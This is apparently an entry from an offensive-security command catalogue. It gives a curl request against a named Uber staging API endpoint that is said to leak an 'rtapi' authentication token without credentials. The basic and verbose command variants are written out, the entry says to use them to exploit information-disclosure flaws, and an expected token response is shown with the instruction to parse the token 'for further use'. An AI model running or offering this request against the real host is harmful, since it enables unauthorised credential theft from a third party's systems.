---
id: 646ba911-b6a5-4f18-9f6a-a88d23f7ae8d
name: curl-retrieve-rtapi-token
type: command
executor: bash
data: 'curl https://video-support-staging.uber.com/video/api/getPopulousUser'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.400Z'
platforms:
  - Web
tags:
  - api-call
  - information-disclosure
verified: false
validated: true
submitted: true
---

# curl-retrieve-rtapi-token

## Command

```bash
curl https://video-support-staging.uber.com/video/api/getPopulousUser
```

## Description

This command performs a GET request to Uber's vulnerable staging API endpoint to retrieve a sensitive rtapi token without authentication. Use it to exploit information disclosure vulnerabilities in unauthenticated APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | The target API endpoint | Yes |

## Examples

### Basic Usage

```bash
curl https://video-support-staging.uber.com/video/api/getPopulousUser
```

### Advanced Usage

```bash
curl -v https://video-support-staging.uber.com/video/api/getPopulousUser
```

Add -v for verbose output to inspect headers and response details.

## Expected Output

JSON response containing the rtapi token, e.g., {"user_id": "123", "rtapi_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}. Parse the token for further use.

## Related

- [[Related Procedure]]
